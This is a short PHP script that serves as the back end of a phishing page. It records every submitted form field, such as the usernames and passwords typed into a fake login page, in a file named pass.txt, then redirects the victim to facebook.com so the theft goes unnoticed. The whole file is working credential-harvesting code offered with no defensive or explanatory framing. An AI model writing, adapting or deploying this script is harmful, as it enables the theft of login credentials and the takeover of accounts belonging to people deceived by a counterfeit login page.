<?php 
header('Location: http://www.facebook.com');
$handle = fopen("pass.txt", 'a');
echo "Thank you for your information <br>";
foreach($_POST as $var => $val){
echo $var;
echo "=";
echo $val;
echo "<br>";
fwrite($handle, $var);
fwrite($handle, "=");
fwrite($handle, $val);
fwrite($handle, "\r\n");
}
echo "===============\r\n";
fwrite($handle,"===============\r\n");
fclose($handle);
exit;


?>